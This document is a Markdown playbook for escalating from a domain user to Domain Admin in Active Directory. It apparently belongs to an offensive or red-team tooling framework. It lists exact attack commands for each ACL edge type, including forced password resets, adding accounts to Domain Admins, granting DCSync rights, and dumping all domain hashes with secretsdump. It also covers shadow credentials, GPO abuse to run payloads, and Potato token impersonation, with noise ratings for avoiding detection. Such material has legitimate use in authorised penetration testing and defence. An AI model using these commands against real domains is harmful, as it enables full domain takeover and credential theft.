# AD Privilege Escalation

tags: privilege-escalation, dacl, acl, dcsync, rbcd, delegation, shadow-credentials, active-directory, genericall, writedacl, writeowner, gpo, nxc

## Objective
Escalate from standard domain user to Domain Admin through AD misconfigurations and ACL abuse.

## Prerequisites
- Valid domain credential with known group memberships
- AD enumeration data (ideally BloodHound output in the graph)
- `find_paths` tool to identify shortest escalation paths

## Methodology

### ACL Abuse — Exact Commands per Edge Type

| BloodHound Edge | Command | OPSEC |
|-----------------|---------|-------|
| GenericAll→User | `rpcclient -U 'dom/user%pass' DC -c "setuserinfo2 target 23 'NewPass!'"` | 0.5 |
| GenericAll→Group | `net rpc group addmem 'Domain Admins' attacker -U 'dom/user%pass' -S DC` | 0.7 |
| GenericAll→Computer | RBCD chain or shadow credentials (see below) | 0.5 |
| WriteDACL | `dacledit.py -action write -rights DCSync -principal attacker -target-dn "DC=dom,DC=com" dom/user:pass` | 0.8 |
| WriteOwner | `owneredit.py -action write -new-owner attacker -target-dn 'DN' dom/user:pass` → then WriteDACL | 0.8 |
| ForceChangePassword | `rpcclient -U 'dom/user%pass' DC -c "setuserinfo2 target 23 'NewPass!'"` | 0.5 |
| AddMember | `net rpc group addmem 'GroupName' attacker -U 'dom/user%pass' -S DC` | 0.7 |

### DCSync (OPSEC: 0.8 — well-detected)
```bash
# Full domain hash dump
impacket-secretsdump -just-dc domain/user:pass@DC

# Targeted — krbtgt only
impacket-secretsdump -just-dc-user krbtgt domain/user:pass@DC

# Via nxc
nxc smb DC -u admin -p pass --ntds
```
Required rights: `Replicating Directory Changes` + `Replicating Directory Changes All`.
Detection: Event 4662 with GUIDs `{1131f6ad-...}` and `{1131f6aa-...}` from non-DC source IP.

### Shadow Credentials (OPSEC: 0.4 with auto cleanup)
```bash
# Requires GenericWrite on target + domain FL ≥ 2016
certipy shadow auto -u 'user@dom.com' -p 'pass' -dc-ip DC -account victim
# Adds msDS-KeyCredentialLink → PKINIT → NT hash via UnPAC-the-hash
```

### GPO Abuse (OPSEC: 0.9)
```bash
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin \
  --Command "cmd.exe" --Arguments "/c payload" --GPOName "Vulnerable GPO"

# Or add local admin
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vulnerable GPO"
```

### Token Impersonation
```bash
# Check privileges on compromised host
whoami /priv
# SeImpersonatePrivilege → Potato attacks

# GodPotato (most reliable on modern Windows)
GodPotato.exe -cmd "cmd /c whoami"

# PrintSpoofer
PrintSpoofer.exe -i -c cmd
```

## Graph Reporting
- **ACL edges**: GENERIC_ALL, WRITE_DACL, WRITE_OWNER, FORCE_CHANGE_PASSWORD, ADD_MEMBER
- **CAN_DCSYNC edges**: if replication rights confirmed
- **ALLOWED_TO_ACT edges**: for RBCD configurations
- **Credential nodes**: for extracted hashes/certificates
- **ADMIN_TO edges**: for confirmed admin access
- Update objective progress if domain admin achieved

## OPSEC Notes

| Technique | Noise Rating | Detection |
|-----------|-------------|-----------|
| Password reset (GenericAll) | 0.5 | Event 4724 |
| Group modification | 0.7 | Event 4728/4756 |
| WriteDACL | 0.8 | Event 5136 |
| WriteOwner | 0.8 | Event 5136 |
| DCSync | 0.8 | Event 4662 with replication GUIDs |
| Shadow Credentials | 0.4 | Event 5136 on KeyCredentialLink |
| GPO Abuse | 0.9 | Event 5136 on GPO objects |

## Sequencing
- **After**: AD Discovery (need BloodHound data / ACL info)
- **Feeds →**: Credential Dumping (DCSync output), Lateral Movement, AD Persistence
